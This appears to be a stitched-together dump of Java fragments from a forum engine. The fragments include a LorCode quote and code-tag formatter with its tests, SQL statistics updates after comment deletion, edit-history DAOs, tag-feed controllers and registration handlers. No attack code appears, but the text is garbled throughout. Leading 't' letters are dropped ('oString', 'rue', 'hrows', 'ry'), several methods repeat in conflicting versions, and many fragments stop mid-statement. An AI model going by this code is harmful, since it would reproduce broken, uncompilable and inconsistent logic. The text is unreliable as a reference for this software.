} } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . oString ( ) ; } 
public void estToLorCodeTexFormatter ( ) { assertEquals ( RESULT_QUOTING1 , oLorCodeTexFormatter . format ( QUOTING1 ) ) ; assertEquals ( RESULT_QUOTING2 , oLorCodeTexFormatter . format ( QUOTING2 ) ) ; assertEquals ( RESULT_QUOTING3 , oLorCodeTexFormatter . format ( QUOTING3 ) ) ; assertEquals ( " [quote]test[br][/quote]test " , oLorCodeTexFormatter . format ( " >test ntest " ) ) ; 4 assertEquals("testtesttest", toLorCodeTexFormatter.format("testtesttest")); 1 assertEquals("test[quote]test[/quote]", toLorCodeTexFormatter.format("test>test")); 7 assertEquals("test &", toLorCodeTexFormatter.format("test &")); 8 assertEquals("test[br]test", toLorCodeFormatter.format("test\rtest", true)); 9 assertEquals("test[br]test", toLorCodeFormatter.format("testtest", true)); 10 assertEquals("[quote]test[br][/quote]test", toLorCodeFormatter.format(">testtest", true)); 11 assertEquals("[quote]test[br]test[/quote]", toLorCodeFormatter.format(">test>test", true)); 12 } 
public void codeEscape ( ) { assertEquals ( " [code][/code] " , oLorCodeTexFormatter . format ( " [code][/code] " ) ) ; assertEquals ( " [code=perl][/code] " , oLorCodeTexFormatter . format ( " [code=perl][/code] " ) ) ; assertEquals ( " [[code]][[/code]] " , oLorCodeFormatter . format ( " [code][/code] " , rue ) ) ; assertEquals ( " [[code=perl]][[/code]] " , oLorCodeFormatter . format ( " [code=perl][/code] " , rue ) ) ; 
public void codeAndQuoteTest ( ) { assertEquals ( " [quote] test [br][/quote][code] " + " > test " + " [/code] " , oLorCodeTexFormatter . format ( " > test " + " [code] " + " > test " + " [/code] " ) ) ; assertEquals ( " [quote] test [br][/quote][code] " + " > test " + " [/code] " , oLorCodeTexFormatter . format ( " > test " + " [code] " + " > test " + " [/code] " ) ) ; assertEquals ( " [quote] test [br] [[code]] [br] test [/quote] " , oLorCodeTexFormatter . format ( " > test " + " > [code] " + " > test " ) ) ; assertEquals ( " [quote] test [[code]] [br] test[br] test [[/code]][/quote] " , oLorCodeTexFormatter . format ( " > test [code] " + " > test " + " > test [/code] " ) ) ; assertEquals ( " [code]test[/code] " + 
public void againQuoteFormatter ( ) { assertEquals ( " [quote]one[br][quote]two[br][/quote]one[br][quote][quote]three[/quote][/quote][/quote] " , oLorCodeFormatter . format ( " >one n>>two n>one n>>>three " , rue ) ) ; assertEquals ( " [quote]one[br][quote]two[br][/quote]one[br][quote][quote]three[/quote][/quote][/quote] " , oLorCodeTexFormatter . format ( " >one n>>two n>one n>>>three " ) ) ; 
public String format ( String ext , boolean quoting ) { String newText = ToLorCodeTexFormatter . escapeCode ( ext ) ; if ( quoting ) { return quote ( newText ) ; 
protected String quote ( String ext ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = ext . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } else { buf . append ( " [br] " ) ; } continue ; } Matcher m = ToLorCodeTexFormatter . QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel > globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel - globalNestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . oString ( ) ; } 
public static String escapeCode ( String ext ) { return ext . replaceAll ( " \\ [(/?code(:?=[ \\ w \\ s]+)?) \\ ] " , " [[$1]] " ) ; } 
public static String escapeCode ( String ext ) { return ext . replaceAll ( " ([^ \\ []|^) \\ [(/?code(:?=[ \\ w \\ s]+)?) \\ ] " , " $1[[$2]] " ) ; } 
public void codeEscapeBasic ( ) { assertEquals ( " [[code]] " , ToLorCodeTexFormatter . escapeCode ( " [code] " ) ) ; assertEquals ( " [[code]] " , ToLorCodeTexFormatter . escapeCode ( " [code] " ) ) ; assertEquals ( " [[/code]] " , ToLorCodeTexFormatter . escapeCode ( " [/code] " ) ) ; assertEquals ( " [[/code]] " , ToLorCodeTexFormatter . escapeCode ( " [/code] " ) ) ; assertEquals ( " [[code]] " , ToLorCodeTexFormatter . escapeCode ( " [[code]] " ) ) ; assertEquals ( " [[code]] " , ToLorCodeTexFormatter . escapeCode ( " [[code]] " ) ) ; assertEquals ( " [[/code]] " , ToLorCodeTexFormatter . escapeCode ( " [[/code]] " ) ) ; assertEquals ( " ][[code]] " , ToLorCodeTexFormatter . escapeCode ( " ][code] " ) ) ; assertEquals ( " [[code]] [[code]] " , ToLorCodeTexFormatter . escapeCode ( " [code] [code] " ) ) ; assertEquals ( " [[code]] [[/code]] " , ToLorCodeTexFormatter . escapeCode ( " [code] [/code] " ) ) ; 
public void codeEscape ( ) { assertEquals ( " [code][/code] " , oLorCodeTexFormatter . format ( " [code][/code] " ) ) ; assertEquals ( " [code=perl][/code] " , oLorCodeTexFormatter . format ( " [code=perl][/code] " ) ) ; assertEquals ( " [[code]] [[/code]] " , oLorCodeFormatter . format ( " [code] [/code] " , rue ) ) ; assertEquals ( " [[code=perl]] [[/code]] " , oLorCodeFormatter . format ( " [code=perl] [/code] " , rue ) ) ; 
public void codeAndQuoteTest ( ) { assertEquals ( " [quote] test [br][/quote][code] " + " > test " + " [/code] " , oLorCodeTexFormatter . format ( " > test " + " [code] " + " > test " + " [/code] " ) ) ; assertEquals ( " [quote] test [br][/quote][code] " + " > test " + " [/code] " , oLorCodeTexFormatter . format ( " > test " + " [code] " + " > test " + " [/code] " ) ) ; assertEquals ( " [quote] test [br] [[code]] [br] test [/quote] " , oLorCodeTexFormatter . format ( " > test " + " > [code] " + " > test " ) ) ; assertEquals ( " [quote] test [[code]] [br] test[br] test [[/code]][/quote] " , oLorCodeTexFormatter . format ( " > test [code] " + " > test " + " > test [/code] " ) ) ; assertEquals ( " [code]test[/code] " + " [quote] test[/quote] " , oLorCodeTexFormatter . format ( " [code]test[/code] " + " > test " ) ) ; assertEquals ( " [[code]] test " , oLorCodeTexFormatter . format ( " [[code]] test " ) ) ; assertEquals ( " [quote] [[code]] test[/quote] " , 
private String processMessage ( String msg , String mode ) { if ( msg = = null ) { return " " ; } if ( " ntobr " . equals ( mode ) ) { return oLorCodeFormatter . format ( msg , false ) ; 
public String format ( String ext ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = ext . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; boolean isCode = false ; for ( String line : lines ) { currentLine + = 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } else { buf . append ( '' ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( ! isCode & & m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel > globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel - globalNestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( escapeCode ( line . substring ( nestingLevel ) ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } Matcher codeMatcher = CODE_PATTERN . matcher ( line ) ; if ( codeMatcher . find ( ) ) { isCode = rue ; } Matcher codeEndMatcher = CODE_END_PATTERN . matcher ( line ) ; if ( codeEndMatcher . find ( ) ) { if ( globalNestingLevel > 0 ) { line = escapeCode ( line ) ; } else { isCode = false ; } } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( '' ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . oString ( ) ; } 
public void codeAndQuoteTest ( ) { assertEquals ( " [quote] test [br][/quote][code] " + " > test " + " [/code] " , oLorCodeTexFormatter . format ( " > test " + " [code] " + " > test " + " [/code] " ) ) ; assertEquals ( " [quote] test [br][/quote][code] " + " > test " + " [/code] " , oLorCodeTexFormatter . format ( " > test " + " [code] " + " > test " + " [/code] " ) ) ; assertEquals ( " [quote] test [br] [[code]] [br] test [/quote] " , oLorCodeTexFormatter . format ( " > test " + " > [code] " + " > test " ) ) ; assertEquals ( " [quote] test [[code]] [br] test[br] test [[/code]][/quote] " , oLorCodeTexFormatter . format ( " > test [code] " + " > test " + " > test [/code] " ) ) ; assertEquals ( " [code]test[/code] " + " [quote] test[/quote] " , oLorCodeTexFormatter . format ( " [code]test[/code] " + " > test " ) ) ; assertEquals ( " [[code]] test " , oLorCodeTexFormatter . format ( " [[code]] test " ) ) ; assertEquals ( " [quote] [[code]] test[/quote] " , oLorCodeTexFormatter . format ( " > [[code]] test " ) ) ; assertEquals ( " [[code]] test " + 
private String processMessage ( String msg , String mode ) { if ( " ntobr " . equals ( mode ) ) { return oLorCodeFormatter . format ( msg , rue ) ; 
public boolean isThreeColumnsOnMain ( ) { return false ; return threeColumnsOnMain; 
public void doFilter ( ServletRequest servletRequest , ServletResponse servletResponse , FilterChain filterChain ) hrows ServletException , IOException { if ( filterConfig = = null ) { return ; } HttpServletRequest hsr = ( HttpServletRequest ) servletRequest ; String path = hsr . getServletPath ( ) ; if ( ! path . endsWith ( " .css " ) & & ! path . endsWith ( " .png " ) & & ! path . endsWith ( " .jpg " ) & & ! path . endsWith ( " jpg " ) ) { ry { Template mpl = new Template ( ( HttpServletRequest ) servletRequest , ( HttpServletResponse ) servletResponse , userDao , configuration ) ; servletRequest . setAttribute ( " emplate " , mpl ) ; } catch ( Exception ex ) { logger . fatal ( " Can't build Template " , ex ) ; return ; } } filterChain . doFilter ( servletRequest , servletResponse ) ; } 
private void updateStatsAfterDelete ( int commentId ) { int opicId = jdbcTemplate . queryForInt ( " SELECT topic FROM comments WHERE id=? " , commentId ) ; jdbcTemplate . update ( " UPDATE topics SET stat1=stat1-1, lastmod=CURRENT_TIMESTAMP WHERE id = ? " , opicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat2=stat1 WHERE id=? AND stat2 > stat1 " , opicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat3=stat1 WHERE id=? AND stat3 > stat1 " , opicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat4=stat1 WHERE id=? AND stat4 > stat1 " , opicId ) ; int groupId = jdbcTemplate . queryForInt ( " SELECT groupid FROM topics WHERE id = ? " , opicId ) ; jdbcTemplate . update ( " UPDATE groups SET stat1=stat1-1 WHERE id = ? " , groupId ) ; } 
private void updateStatsAfterDelete ( int commentId , int count ) { int opicId = jdbcTemplate . queryForInt ( " SELECT topic FROM comments WHERE id=? " , commentId ) ; jdbcTemplate . update ( " UPDATE topics SET stat1=stat1-?, lastmod=CURRENT_TIMESTAMP WHERE id = ? " , count , opicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat2=stat1 WHERE id=? AND stat2 > stat1 " , opicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat3=stat1 WHERE id=? AND stat3 > stat1 " , opicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat4=stat1 WHERE id=? AND stat4 > stat1 " , opicId ) ; int groupId = jdbcTemplate . queryForInt ( " SELECT groupid FROM topics WHERE id = ? " , opicId ) ; jdbcTemplate . update ( " UPDATE groups SET stat1=stat1-? WHERE id = ? " , count , groupId ) ; } 
public List < Integer > deleteReplys ( int msgid , User user , boolean score ) { List < Integer > deleted = deleteReplys ( msgid , user , score , 0 ) ; if ( ! deleted . isEmpty ( ) ) { updateStatsAfterDelete ( msgid , deleted . size ( ) ) ; } return deleted ; } 
private List < Integer > doDeleteReplys ( int msgid , User user , boolean score ) { List < Integer > deleted = deleteReplys ( msgid , user , score , 0 ) ; if ( ! deleted . isEmpty ( ) ) { updateStatsAfterDelete ( msgid , deleted . size ( ) ) ; } return deleted ; } 
public List < Integer > deleteReplys ( int msgid , User user , boolean score ) { return doDeleteReplys ( msgid , user , score ) ; } 
public void cleanEvents ( ) { userEventService . cleanupOldEvents ( MAX_EVENTS ) ; } 
public void updateStats ( ) { logger . debug ( " Updating statistics " ) ; statUpdate . execute ( ) ; statMonthly . execute ( ) ; } 
public void updateGroupStats ( ) { logger . debug ( " Updating group statistics " ) ; statUpdate2 . execute ( ) ; } 
public ModelAndView showEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid ) hrows Exception { Topic message = messageDao . getById ( msgid ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( message , request . isSecure ( ) ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; List < String > javaScriptsForLayout = new ArrayList < String > ( ) ; javaScriptsForLayout . add ( " diff_match_patch.js " ) ; javaScriptsForLayout . add ( " lor_view_diff_history.js " ) ; modelAndView . addObject ( " javascriptsForLayout " , javaScriptsForLayout ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; return modelAndView ; } 
public void processRow ( ResultSet resultSet ) hrows SQLException { EditHistoryDto editHistoryDto = new EditHistoryDto ( ) ; editHistoryDto . setId ( resultSet . getInt ( " id " ) ) ; editHistoryDto . setMsgid ( resultSet . getInt ( " msgid " ) ) ; editHistoryDto . setEditor ( resultSet . getInt ( " editor " ) ) ; editHistoryDto . setOldmessage ( resultSet . getString ( " oldmessage " ) ) ; editHistoryDto . setEditdate ( resultSet . getTimestamp ( " editdate " ) ) ; editHistoryDto . setOldtitle ( resultSet . getString ( " oldtitle " ) ) ; editHistoryDto . setOldtags ( resultSet . getString ( " oldtags " ) ) ; editInfoDTOs . add ( editHistoryDto ) ; } 
public void insert ( EditHistoryDto editHistoryDto ) { editInsert . execute ( new BeanPropertySqlParameterSource ( editHistoryDto ) ) ; } 
public List < EditHistoryDto > loadEditInfo ( int msgid ) { List < EditHistoryDto > list = jdbcTemplate . query ( queryEditInfo , BeanPropertyRowMapper . newInstance ( EditHistoryDto . class ) , msgid ) ; return ImmutableList . copyOf ( list ) ; } 
public void insert ( EditHistoryDto editHistoryDto ) { editHistoryDao . insert ( editHistoryDto ) ; } 
public boolean apply ( EditHistoryDto input ) { return input . getEditor ( ) ! = message . getUid ( ) ; } 
public User apply ( EditHistoryDto input ) { ry { return userDao . getUserCached ( input . getEditor ( ) ) ; 
public boolean apply ( EditHistoryDto input ) { return input . getEditor ( ) ! = message . getUid ( ) ; } 
public Integer apply ( EditHistoryDto input ) { return input . getEditor ( ) ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new CommentRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public boolean supports ( Class < ? > clazz ) { return CommentRequest . class . equals ( clazz ) ; } 
public void resetUnreadReplies ( int userId ) { jdbcTemplate . update ( UPDATE_RESET_UNREAD_REPLIES , userId ) ; jdbcTemplate . update ( " UPDATE user_events SET unread=false WHERE userid=? AND unread " , userId ) ; } 
private String processMessage ( String msg , String mode ) { if ( " ntobr " . equals ( mode ) ) { return oLorCodeFormatter . format ( msg , rue ) ; 
public int addToMemories ( int userid , int opic , boolean watch ) { List < Integer > res = jdbcTemplate . queryForList ( " SELECT id FROM memories WHERE userid=? AND topic=? AND watch=? FOR UPDATE " , Integer . class , userid , opic , watch ) ; if ( res . isEmpty ( ) ) { return insertTemplate . executeAndReturnKey ( ImmutableMap . < String , Object > of ( 
public boolean isUserWatches ( ) { return userWatches ; } 
public void getUserTopicsFeedTest ( ) hrows UserErrorException , TagNotFoundException { User user = mock ( User . class ) ; when ( user . getId ( ) ) . henReturn ( 12345 ) ; List < Topic > opicList = opicListService . getUserTopicsFeed ( user , 123 , rue , false ) ; assertEquals ( new Integer ( 20 ) , opicListDto . getLimit ( ) ) ; assertEquals ( new Integer ( 123 ) , opicListDto . getOffset ( ) ) ; assertEquals ( TopicListDao . CommitMode . ALL , opicListDto . getCommitMode ( ) ) ; assertEquals ( 12345 , opicListDto . getUserId ( ) ) ; assertTrue ( opicListDto . isUserFavs ( ) ) ; } 
public void getUserTopicsFeedWithSectionAndGroupTest ( ) hrows UserErrorException , TagNotFoundException { User user = mock ( User . class ) ; when ( user . getId ( ) ) . henReturn ( 12345 ) ; List < Topic > opicList = opicListService . getUserTopicsFeed ( user , section1 , group , 123 , rue , false ) ; assertEquals ( 1 , opicListDto . getSections ( ) . size ( ) ) ; Integer sectionId = opicListDto . getSections ( ) . iterator ( ) . next ( ) ; assertEquals ( new Integer ( 11 ) , sectionId ) ; assertEquals ( 111 , opicListDto . getGroup ( ) ) ; assertEquals ( new Integer ( 20 ) , opicListDto . getLimit ( ) ) ; assertEquals ( new Integer ( 123 ) , opicListDto . getOffset ( ) ) ; assertEquals ( TopicListDao . CommitMode . ALL , opicListDto . getCommitMode ( ) ) ; assertEquals ( 12345 , opicListDto . getUserId ( ) ) ; assertTrue ( opicListDto . isUserFavs ( ) ) ; } 
public static Group buildGroup ( ResultSet rs ) hrows SQLException { int restrict_topics = rs . getInt ( " restrict_topics " ) ; if ( rs . wasNull ( ) ) { restrict_topics = TopicPermissionService . POSTSCORE_UNRESTRICTED ; } Group group = new Group ( rs . getBoolean ( " moderate " ) , rs . getBoolean ( " imagepost " ) , rs . getBoolean ( " vote " ) , rs . getBoolean ( " havelink " ) , rs . getInt ( " section " ) , rs . getString ( " linktext " ) , rs . getString ( " urlname " ) , rs . getString ( " image " ) , restrict_topics , rs . getInt ( " restrict_comments " ) , rs . getInt ( " id " ) , rs . getInt ( " stat1 " ) , rs . getInt ( " stat3 " ) , rs . getBoolean ( " resolvable " ) ) ; group . setTitle ( rs . getString ( " itle " ) ) ; group . setInfo ( rs . getString ( " info " ) ) ; group . setLongInfo ( rs . getString ( " longinfo " ) ) ; return group ; } 
public ModelAndView agFeed ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response ) ; boolean rss = opicListForm . getOutput ( ) ! = null & & " rss " . equals ( opicListForm . getOutput ( ) ) ; if ( ! rss ) { modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; } Template mpl = Template . getTemplate ( request ) ; if ( mpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; } } return modelAndView ; } 
public ModelAndView viewAll ( @RequestParam ( value = " section " , required = false , defaultValue = " 0 " ) int sectionId , HttpServletRequest request ) { Template mpl = Template . getTemplate ( request ) ; ModelAndView modelAndView = new ModelAndView ( " view-all " ) ; Section section = null ; if ( sectionId ! = 0 ) { section = sectionService . getSection ( sectionId ) ; modelAndView . addObject ( " section " , section ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 1 ) ; List < Topic > messages = opicListService . getAllTopicsFeed ( section , calendar . getTime ( ) ) ; modelAndView . addObject ( " messages " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , mpl . getCurrentUser ( ) ) ) ; List < TopicListDto . DeletedTopic > deleted = opicListService . getDeletedTopicsFeed ( sectionId ) ; modelAndView . addObject ( " deletedTopics " , deleted ) ; modelAndView . addObject ( " sections " , sectionService . getSectionList ( ) ) ; return modelAndView ; } 
public View agFeedOld ( TopicListRequest opicListForm ) hrows Exception { return new RedirectView ( TAG_URI_TEMPLATE . expand ( opicListForm . getTag ( ) ) . oString ( ) ) ; } 
public ModelAndView agFeed ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response , @PathVariable String ag ) hrows Exception { opicListForm . setTag ( ag ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response ) ; boolean rss = opicListForm . getOutput ( ) ! = null & & " rss " . equals ( opicListForm . getOutput ( ) ) ; if ( ! rss ) { modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; } Template mpl = Template . getTemplate ( request ) ; if ( mpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; } } return modelAndView ; } 
public View agFeedOld ( TopicListRequest opicListForm ) hrows Exception { return new RedirectView ( agListUrl ( opicListForm . getTag ( ) ) ) ; } 
public static String agListUrl ( String ag ) { return TAG_URI_TEMPLATE . expand ( ag ) . oString ( ) ; } 
public ModelAndView agFeed ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response , @PathVariable String ag ) hrows Exception { opicListForm . setTag ( ag ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response ) ; boolean rss = opicListForm . getOutput ( ) ! = null & & " rss " . equals ( opicListForm . getOutput ( ) ) ; if ( ! rss ) { modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; } Template mpl = Template . getTemplate ( request ) ; if ( mpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; } } modelAndView . addObject ( " url " , agListUrl ( ag ) ) ; return modelAndView ; } 
public ModelAndView agFeed ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response , @PathVariable String ag ) hrows Exception { opicListForm . setTag ( ag ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response ) ; boolean rss = opicListForm . getOutput ( ) ! = null & & " rss " . equals ( opicListForm . getOutput ( ) ) ; if ( ! rss ) { modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; } Template mpl = Template . getTemplate ( request ) ; if ( mpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; } } modelAndView . addObject ( " url " , agListUrl ( ag ) ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public void init ( ) { ry { mainURI = new URI ( properties . getProperty ( " MainUrl " ) , rue , " UTF-8 " ) ; } catch ( Exception e ) { hrow new RuntimeException ( ERR_MSG + e . getMessage ( ) ) ; } if ( ! mainURI . isAbsoluteURI ( ) ) { hrow new RuntimeException ( ERR_MSG + " URI not absolute path " ) ; } ry { String mainHost = mainURI . getHost ( ) ; if ( mainHost = = null ) { hrow new RuntimeException ( ERR_MSG + " bad URI host " ) ; } } catch ( URIException e ) { hrow new RuntimeException ( ERR_MSG + e . getMessage ( ) ) ; } ry { secureURI = new URI ( properties . getProperty ( " SecureUrl " , mainURI . oString ( ) . replaceFirst ( " http " , " https " ) ) , rue , " UTF-8 " ) ; 
public ModelAndView show ( @ModelAttribute ( " form " ) EditRegisterRequest form , HttpServletRequest request , HttpServletResponse response ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; UserInfo userInfo = userDao . getUserInfoClass ( user ) ; ModelAndView mv = new ModelAndView ( " edit-reg " ) ; form . setEmail ( user . getEmail ( ) ) ; form . setUrl ( userInfo . getUrl ( ) ) ; form . setTown ( userInfo . getTown ( ) ) ; form . setName ( user . getName ( ) ) ; form . setInfo ( StringEscapeUtils . unescapeHtml ( userDao . getUserInfo ( user ) ) ) ; response . setHeader ( " Cache-Control " , " no-store, no-cache, must-revalidate " ) ; return mv ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new EditRegisterValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public boolean supports ( Class < ? > aClass ) { return EditRegisterRequest . class . equals ( aClass ) ; } 
public ModelAndView register ( @ModelAttribute ( " form " ) RegisterRequest form , HttpServletRequest request , HttpServletResponse response ) hrows Exception { response . setHeader ( " Cache-Control " , " no-store, no-cache, must-revalidate " ) ; return new ModelAndView ( " register " ) ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new RegisterRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new EditRegisterRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public boolean supports ( Class aClass ) { return EditRegisterRequest . class . equals ( aClass ) ; } 
public boolean supports ( Class aClass ) { return RegisterRequest . class . equals ( aClass ) ; } 
public ModelAndView agFeed ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response , @PathVariable String ag ) hrows Exception { opicListForm . setTag ( ag ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response ) ; boolean rss = opicListForm . getOutput ( ) ! = null & & " rss " . equals ( opicListForm . getOutput ( ) ) ; if ( ! rss ) { modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; } Template mpl = Template . getTemplate ( request ) ; if ( mpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; } } modelAndView . addObject ( " url " , agListUrl ( ag ) ) ; modelAndView . addObject ( " params " , null ) ; modelAndView . setViewName ( " ag-topics " ) ; return modelAndView ; } 
public int getTagId ( String ag , boolean skipZero ) hrows TagNotFoundException { List < Integer > res = jdbcTemplate . queryForList ( QUERY_TAG_ID_BY_NAME + ( skipZero ? " AND counter>0 " : " " ) , Integer . class , ag ) ; if ( res . isEmpty ( ) ) { hrow new TagNotFoundException ( ) ; 
